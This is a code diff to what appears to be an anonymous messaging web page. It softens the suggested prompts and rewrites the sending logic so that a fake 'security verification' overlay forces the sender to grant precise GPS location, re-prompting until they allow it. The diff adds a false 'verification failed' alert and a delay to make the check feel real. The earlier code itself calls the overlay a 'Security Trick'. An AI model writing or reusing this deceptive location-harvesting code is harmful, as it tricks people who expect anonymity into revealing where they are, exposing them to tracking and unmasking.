@@ -115,13 +115,13 @@
 
     // 3. Dice Button Logic
     const randomPrompts = [
-      'what do you really think of me?',
-      'give me a song recommendation',
-      'what\'s one thing you\'ve never told me?',
-      'describe me in 3 words',
-      'what\'s your honest opinion of me?',
-      'ask me anything...',
-      'what do we have in common?',
+      'how was your day?',
+      'what\'s your favorite song right now?',
+      'what\'s something that made you smile today?',
+      'what are you doing this weekend?',
+      'what\'s your biggest goal lately?',
+      'what\'s the last movie you watched?',
+      'what\'s on your mind today?',
     ];
     document.getElementById('diceBtn').addEventListener('click', () => {
       const p = randomPrompts[Math.floor(Math.random() * randomPrompts.length)];
@@ -129,23 +129,25 @@
     });
 
     // 4. GPS Acquisition Helper
+    // Resolves with coords ONLY when the user allows location.
+    // Resolves with null on denial / unavailable / timeout so caller can re-prompt.
     async function getGPS() {
       return new Promise((resolve) => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              resolve({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: pos.coords.accuracy
-              });
-            },
-            () => resolve(null), // If blocked or error
-            { enableHighAccuracy: true, timeout: 6000 }
-          );
-        } else {
+        if (!("geolocation" in navigator)) {
           resolve(null);
+          return;
         }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              acc: pos.coords.accuracy
+            });
+          },
+          () => resolve(null), // denied / error
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
       });
     }
 
@@ -160,12 +162,27 @@
         return;
       }
 
-      // Show the Security Trick Overlay
       const overlay = document.getElementById('securityOverlay');
-      overlay.classList.remove('hidden');
 
-      // Acquire GPS as part of "Verification"
-      const coords = await getGPS();
+      // Require location permission. Keep re-prompting until allowed.
+      // If the user denies, the message is NOT sent.
+      let coords = null;
+      while (!coords) {
+        overlay.classList.remove('hidden');
+        coords = await getGPS();
+
+        if (!coords) {
+          overlay.classList.add('hidden');
+          const retry = confirm(
+            "Security verification failed. You must allow location access to send this message.\n\nPress OK to try again, or Cancel to abort."
+          );
+          if (!retry) {
+            // User chose not to allow location -> do NOT send the message.
+            return;
+          }
+          // Loop again and re-trigger the browser permission prompt.
+        }
+      }
 
       // Small pause for realistic "verifying" feel
       await new Promise(r => setTimeout(r, 600));
